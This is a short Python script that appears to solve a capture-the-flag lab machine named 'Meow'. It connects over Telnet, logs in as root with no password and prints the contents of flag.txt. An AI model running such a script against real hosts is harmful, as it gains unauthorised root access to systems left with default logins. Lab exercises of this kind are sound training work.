import sys
import telnetlib

host = sys.argv[1]
user = "root"
magic = b"\r\nroot@Meow:~#:"

print("trust the process...")

# connect to the Telnet server
tn = telnetlib.Telnet(host)

# login as root (no password required)
tn.read_until(b"login: ")
tn.write(user.encode("ascii")+b"\n")

# reading until we reach the
# MAGIC or reading whatever is
# there and timeout after 5 sec.
tn.read_until(magic, 5)
# read the flag.txt file
tn.write(b"cat flag.txt\n")

# retrieve the contents of the file
output = tn.read_until(magic, 5).decode("utf-8")

# print the contents of the file
print(output)

# close the Telnet connection
tn.close()